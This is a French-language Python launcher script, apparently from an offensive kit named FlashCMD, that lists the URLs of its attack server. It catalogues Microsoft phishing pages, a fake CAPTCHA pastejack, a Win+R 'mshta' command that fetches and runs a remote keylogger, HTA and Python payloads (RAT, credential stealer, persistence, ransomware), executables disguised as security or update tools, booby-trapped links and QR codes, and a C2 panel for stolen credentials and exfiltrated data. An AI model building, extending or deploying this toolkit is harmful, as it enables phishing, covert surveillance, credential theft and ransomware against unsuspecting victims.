#!/usr/bin/env python3
"""
generate.py — Génère et affiche tous les liens
Usage : python generate.py
"""
import json, pathlib, socket

def get_public_url() -> str:
    cfg = pathlib.Path(".config.json")
    if cfg.exists():
        try:
            return json.loads(
                cfg.read_text()
            ).get("public_url", "").rstrip("/")
        except Exception:
            pass
    try:
        s = socket.socket(socket.AF_INET,
                          socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return f"http://{ip}:8080"
    except Exception:
        return "http://localhost:8080"

BASE = get_public_url()
SEP  = "─" * 60

print(f"\n{'='*60}")
print(f"  FlashCMD — Tous les liens")
print(f"  Base : {BASE}")
print(f"{'='*60}")

print(f"\n  PAGES PIÈGE")
print(SEP)
pages = [
    ("Phishing Microsoft (login 2 étapes)",
     "/"),
    ("Fausse MAJ Windows → HTA auto",
     "/update"),
    ("Faux CAPTCHA reCAPTCHA (pastejack)",
     "/captcha"),
    ("Caméra + Écran (popup navigateur)",
     "/surveillance"),
    ("Keylogger JS (formulaire login)",
     "/keylog_page"),
]
for name, path in pages:
    print(f"  {name:<42} {BASE}{path}")

print(f"\n  VECTEURS HTA (Windows natif, sans Python visible)")
print(SEP)
htas = [
    ("Keylogger + persistence", "/hta/keylogger"),
    ("Dropper (tout installer)", "/hta/dropper"),
    ("RAT seul",                 "/hta/rat"),
    ("Stealer seul",             "/hta/stealer"),
]
for name, path in htas:
    print(f"  {name:<42} {BASE}{path}")
print(f"\n  → Commande Win+R à coller :")
print(f'    mshta "{BASE}/hta/keylogger"')

print(f"\n  PAYLOADS PYTHON")
print(SEP)
payloads = [
    ("Dropper (chain complète)",  "dropper"),
    ("Keylogger système",         "keylogger"),
    ("Keylogger Windows .exe",    "keylogger_win"),
    ("RAT HTTP",                  "rat"),
    ("Stealer credentials",       "stealer"),
    ("Persistence démarrage",     "persistence"),
    ("Ransomware AES-256",        "ransomware"),
]
for name, pname in payloads:
    print(f"  {name:<42} {BASE}/payload?name={pname}")

print(f"\n  BUILDS")
print(SEP)
print(f"  Keylogger .exe Windows  "
      f"           {BASE}/builds/WindowsSecuritySvc.exe")
print(f"  Dropper .exe Windows    "
      f"           {BASE}/builds/setup_update.exe")
print(f"  APK Android             "
      f"           {BASE}/builds/security_checker.apk")

print(f"\n  OUTILS")
print(SEP)
tools = [
    ("Piéger URL",    f"{BASE}/go?url=https://youtube.com"),
    ("Shortlink",     f"{BASE}/shorten?url=https://youtube.com"),
    ("QR piégé",      f"{BASE}/qr?url=https://youtube.com"),
    ("Pixel email",   f"{BASE}/track/target1"),
    ("Extension Chrome", f"{BASE}/download/extension"),
]
for name, url in tools:
    print(f"  {name:<42} {url}")

print(f"\n  ADMIN / C2")
print(SEP)
admin = [
    ("Panel admin",           "/admin"),
    ("Dashboard C2",          "/c2"),
    ("Credentials volés",     "/c2/creds"),
    ("Keylogs",               "/c2/keylog"),
    ("Données exfiltrées",    "/c2/exfil"),
    ("Log visites",           "/c2/visits"),
    ("Tracking email",        "/c2/tracking"),
    ("Frames caméra/écran",   "/c2/frames"),
    ("Bots JSON",             "/c2/bots"),
]
for name, path in admin:
    print(f"  {name:<42} {BASE}{path}")

print(f"\n  LANCEMENT")
print(SEP)
print(f"  Tout en une commande : python setup.py")
print(f"  Serveur seul         : python server_v2.py")
print(f"  Compiler .exe        : python build.py")
print(f"  Cloner un site       : python clone.py <url> <nom>")
print(f"  C2 CLI               : "
      f"python c2/c2_server.py {BASE}")
print(f"{'='*60}\n")